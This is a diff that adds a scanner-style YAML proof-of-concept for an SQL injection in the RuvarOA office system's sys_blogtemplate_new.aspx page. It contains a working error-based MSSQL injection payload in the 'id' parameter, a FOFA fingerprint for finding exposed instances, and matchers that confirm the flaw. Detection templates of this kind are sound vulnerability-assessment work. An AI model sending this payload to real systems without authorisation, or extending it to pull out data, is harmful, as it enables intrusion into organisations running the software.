@@ -1,0 +1,26 @@
+id: poc-yaml-ruvaroa-sys-blogtemplate-new-sqli
+info:
+  name: RuvarOA sys_blogtemplate_new SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ruvar-oa
+  fofa: body="txt_admin_key"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /SysManage/sys_blogtemplate_new.aspx?id=%28-1)+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--+%29
+  expression: 'status_code == 500 &&
+
+    contains(body,"[Exception]:") &&
+
+    contains(body,"RuvarOA") &&
+
+    contains(body,"0x" + t2) &&
+
+    contains(body,"转换成数据类型 int 时失败")
+
+    '
+transport: http
